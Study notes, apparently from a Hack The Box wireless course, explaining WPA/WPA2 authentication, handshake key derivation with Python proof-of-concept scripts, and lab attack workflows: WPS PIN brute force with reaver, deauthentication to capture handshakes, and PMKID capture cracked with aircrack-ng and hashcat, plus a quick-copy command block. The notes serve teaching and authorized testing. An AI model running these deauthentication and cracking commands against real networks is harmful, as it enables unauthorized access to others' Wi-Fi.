# Chain #25: WPA & WPA2

**Purpose:** full, structured notes on WPA/WPA2 (Personal & Enterprise), how authentication works (connection cycle, 4‑way handshake, PMK/PMKID), practical recon & attack workflows (WPS, handshake/MIC cracking, PMKID), with **command-by-command explanations** and the exact filters, equations, PoC scripts, and sample outputs you provided.

---

## Wi‑Fi Protected Access Overview

- **WPA / WPA2 / WPA3** are Wi‑Fi Alliance security programs created post‑2000 in response to WEP weaknesses.
- This module **focuses on WPA and WPA2** and their attack surfaces.

### Wi‑Fi Authentication Types (orientation)

Flow overview (per your diagram):

- **WEP → WPA → WPA2 → WPA3**.
- **WPA2:** Personal (PSK) and Enterprise (802.1X → EAP‑TTLS/PAP, PEAP‑MSCHAPv2 → often Certificate‑Based Auth).
- **WPA3:** Personal and Enterprise (EAP‑TLS; CBA).

**Quick definitions**

- **WPA (interim over WEP):** TKIP + MIC; better than WEP but legacy.
    
- **WPA2 (successor):** AES‑CCMP, widely deployed; stronger protections.
    
- **Modes:**
    
    - **WPA‑Personal (PSK):** shared passphrase; home/small‑biz.
        
    - **WPA‑Enterprise (MGT):** 802.1X + RADIUS; EAP methods.
        

---

## WPA/WPA2 Personal (PSK) — Overview

- **Why WPA replaced WEP:** WEP’s static key (40/104 + 24‑bit IV) was exploitable. WPA introduced **TKIP** with **per‑packet key mixing** and **MIC**.
    
- **WPA2:** adds **CCMP/AES** for stronger crypto.
    
- Because PSK is reused among clients, weak passphrases enable **dictionary** and **social engineering/evil‑twin** attacks. Common capture paths: **Handshake capture**, **PMKID capture**, **WPS**, **evil‑twin**.
    

---

## WPA/WPA2 Enterprise (MGT)

- Uses **802.1X** (RADIUS) + **EAP** (e.g., **EAP‑TLS**, **PEAP‑MSCHAPv2**, **EAP‑TTLS/PAP**).
    
- Mitigates PSK dictionary issues but can suffer from **misconfigurations**, **evil‑twin** credential captures, and **downgrade** paths.
    

---

## The Connection Cycle (WPA2‑PSK focus)

Sequence:

1. **Beacon Frames** — AP advertises presence (ciphers, auth types, SSID, rates).
    
2. **Probe Request / Response** — discovery (directed or broadcast; SSID in probe, even if hidden).
    
3. **Authentication Request / Response** — client identifies to AP.
    
4. **Association / Reassociation** — client asks to join; AP accepts/denies.
    
5. **4‑Way Handshake** — derives per‑session keys (PTK) using nonces + MACs.
    
6. **Disassociation / Deauthentication** — connection teardown with reason codes.
    

**Wireshark filters you provided**

- **Beacons:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 8)`
    
- **Probe requests:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 4)`
    
- **Probe responses:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 5)`
    
- **Authentication:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 11)`
    
- **Association request:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0)`
    
- **Association response:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 1)`
    
- **EAPOL (handshake):** `eapol`
    
- **Disassoc/Deauth:** `(wlan.fc.type == 0) && (wlan.fc.type_subtype == 12) or (wlan.fc.type_subtype == 10)`
    

---

## 4‑Way Handshake — Messages & Keys

**Flow (per your diagram & table)**

- **Msg 1:** AP → client: **ANonce**. Client starts constructing **PTK**.
    
    - `PTK = PMK + Anonce + Snonce + AP_MAC (AA) + STA_MAC (SA)`
        
- **Msg 2:** Client → AP: **SNonce + MIC**. AP reconstructs PTK to verify MIC.
    
- **Msg 3:** AP → client: constructs/installs **GTK** (from **GMK**), sends GTK + MIC.
    
- **Msg 4:** Client → AP: acknowledges install; both sides install PTK/GTK.
    

**Key definitions**

- **Anonce / Snonce** — AP/client random nonces.
    
- **SSID** — network name.
    
- **PMK** — derived from PSK + SSID via PBKDF2 (4096 iterations, HMAC‑SHA1) (not transmitted).
    
- **PTK** — derived from PMK + nonces + MACs (used for unicast traffic).
    
- **GMK/GTK** — AP‑generated group keys for multicast/broadcast.
    

### PMK Generation PoC (your script)

```python
import hashlib, binascii
SSID = "HTB-WirelessWanderer"
PSK  = "whatthehex"
PSKB = "supersecurepassphrase"
print("Wireless Network Name: " + SSID)
print("--------------------------------------------")
PMK  = hashlib.pbkdf2_hmac('sha1', PSK.encode(),  SSID.encode(), 4096, 32)
PMKB = hashlib.pbkdf2_hmac('sha1', PSKB.encode(), SSID.encode(), 4096, 32)
print("First Pairwise Master Key:" + str(binascii.hexlify(PMK))  + "\n Real PSK: " + PSK)
print("Second Pairwise Master Key: " + str(binascii.hexlify(PMKB)) + "\n Real PSK:" + PSKB)
```

**Sample output (yours):** shows two distinct PMKs for different PSKs under same SSID.

### PTK Blocks & PoC (your script)

**PTK structure:** KCK | KEK | TK | MIC Tx (TKIP) | MIC Rx (TKIP)

```python
import hashlib, hmac, binascii, random
SSID = "HTB-WirelessWanderer"; PSK = "whatthehex"
PMK = hashlib.pbkdf2_hmac('sha1', PSK.encode(), SSID.encode(), 4096, 32)
APMAC = "00:FF:FF:FF:FF:FF"; CLMAC = "01:FF:FF:FF:FF:FF"
APHEX = binascii.a2b_hex(APMAC.replace(':','')); CLHEX = binascii.a2b_hex(CLMAC.replace(':',''))
Anonce = binascii.a2b_hex(str(random.randint(10000000,99999999)))
Snonce = binascii.a2b_hex(str(random.randint(10000000,99999999)))
KeyData = min(APHEX, CLHEX) + max(APHEX, CLHEX) + min(Anonce, Snonce) + max(Anonce, Snonce)
PTK = hmac.new(PMK, KeyData, hashlib.sha1).digest(); PTK = PTK + b"\x00"*(32-len(PTK))
print("Pairwise Transient Key:", PTK, len(PTK), "bytes")
```

**Sample output (yours):** shows PTK bytes and length (32).

**Additional derivations (as provided):**

```
TK  = PRF(PMK, "Pairwise key expansion", Min(ANonce, SNonce) || Max(ANonce, SNonce))
KCK = PRF(TK,  "Key Confirmation Key", Min(ANonce, SNonce) || Max(ANonce, SNonce))
KEK = PRF(TK,  "Key Encryption Key",  Max(ANonce, SNonce) || Min(ANonce, SNonce))
```

**MIC equation (per your note):**

```
MIC = HMAC-SHA1(PMK, ANonce || SNonce || AP_MAC || Client_MAC || Message_Length)
```

---

## Reconnaissance & Brute‑force (Personal)

### Prepare monitor mode

`sudo airmon-ng start wlan0` → creates `wlan0mon` (kill NM/wpa_supplicant if prompted).

### Scan & identify target

`airodump-ng wlan0mon` → find WPA/WPA2 networks; note **ENC/CIPHER/AUTH** fields.

### WPS enumeration

- `airodump-ng wlan0mon -c 1 --wps` → shows WPS flags (e.g., `2.0 LAB,DISP,PBC,KPAD`).
    
- `wash -i wlan0mon` → quick WPS list; `wash -j -i wlan0mon` → JSON (check `wps_locked` value `2` = not locked).
    
- OUI lookup: `grep -i "28-B2-BD" /var/lib/ieee-data/oui.txt` → vendor.
    

### Reaver setup (monitor quirk workaround)

```
sudo airmon-ng stop wlan0mon
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up && iwconfig
```

Run Reaver:  
`reaver -i mon0 -c 1 -b 28:B2:BD:F4:FF:F1`  
→ Attempts WPS PIN brute force; on success prints **WPS PIN** and **WPA PSK**.

---

## Cracking the MIC (4‑Way Handshake)

### Capture handshake

- Keep `airodump-ng -c 1 -w WPA wlan0mon` running.
    
- Force reconnect: `aireplay-ng -0 5 -a <AP> -c <CLIENT> wlan0mon`.
    
- Airodump header shows: `WPA handshake: <BSSID>` when captured.
    

### Validate handshake

`cowpatty -c -r WPA-01.cap` → confirms all necessary data present.

### Inspect in Wireshark (per your checklist)

- Filter `eapol`. Confirm **Msg 1..4** exist sequentially; **Key nonce** in **Msg 1** equals **Msg 3**; **Msg 4** has **no nonce**, only MIC.
    

### Crack the PSK

- **cowpatty:** `cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s HackTheBox`
    
- **aircrack‑ng:** `aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap` → shows `KEY FOUND!` and key material.
    

---

## PMKID Attack (client‑less)

**Concept:** some APs cache **PMKID** (for roaming). You can request/capture PMKID directly from AP and crack offline.

### PMKID math recap (your formulas)

```
PMK = PBKDF2(PSK, ESSID, 4096)
PMKID = HMAC-SHA1-128(PMK, "PMK Name", AP-MAC, STA-MAC)
```

### PMKID PoC (your script)

```python
from pbkdf2 import PBKDF2
import binascii, hmac, hashlib
PSK='VerySecurePassword'; ESSID='HTB-Wireless'
APMac='00:ca:12:11:12:13'; StMac='00:ca:12:12:13:14'
APhex=binascii.hexlify(binascii.unhexlify(APMac.replace(':','')))
SThex=binascii.hexlify(binascii.unhexlify(StMac.replace(':','')))
message = "PMK Name" + str(APhex) + str(SThex)
pmk = PBKDF2(PSK, ESSID, 4096).read(32)
pmkid = hmac.new(pmk, message.encode('utf-8'), hashlib.sha1).hexdigest()
print("PMKID:", pmkid)
```

**Sample output (yours):** `PMKID: a6ddb59f88c8e902...`

### Capture PMKID in the field

- Discover PMKID presence:  
    `hcxdumptool -i wlan0mon --enable_status=3`
    
- Identify BSSID by ESSID:  
    `airodump-ng wlan0mon --essid HTBWireless`
    
- Targeted capture & save:  
    `hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=E2:73:E7:F5:98:91 --filtermode=2 -o HTBPMKID.pcap`
    
- Convert to Hashcat format:  
    `hcxpcapngtool -o hash HTBPMKID.pcap`
    
- Inspect the `hash` file (shows WPA* lines as in your example).
    
- Crack with Hashcat:  
    `hashcat -m 22000 hash /opt/wordlist.txt`
    
- Show results:  
    `hashcat -m 22000 hash /opt/wordlist.txt --show`
    

**Note:** PMKID can be verified in Wireshark under **EAPOL M1 → WPA Key Data → RSN PMKID tag**.

---

## Reference Snippets (quick copy)

```bash
# Monitor mode & verify
sudo airmon-ng start wlan0 && iwconfig

# Airodump targeted capture
sudo airodump-ng -c <ch> --bssid <BSSID> -w WPA wlan0mon

# Deauth for handshake
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# Handshake check
cowpatty -c -r WPA-01.cap

# Crack handshake (wordlist)
aircrack-ng -w /opt/wordlist.txt -0 WPA-01.cap

# PMKID capture & convert
hcxdumptool -i wlan0mon --enable_status=3 -o out.pcap
hcxpcapngtool -o hash out.pcap
hashcat -m 22000 hash /opt/wordlist.txt --show

# WPS scan & attack
wash -i wlan0mon   # or -j for JSON
reaver -i mon0 -c <ch> -b <BSSID>
```

---

## Summary

WPA/WPA2 rely on PBKDF2‑derived PMK and a nonce‑based 4‑way handshake that never transmits the PSK. In practice, attackers capture a **handshake** (via deauth) or a **PMKID** (client‑less), or exploit **WPS** to obtain the PSK. Your notes here include the **full filters, formulas, scripts, and sample outputs** so nothing is lost; you can use them directly in labs.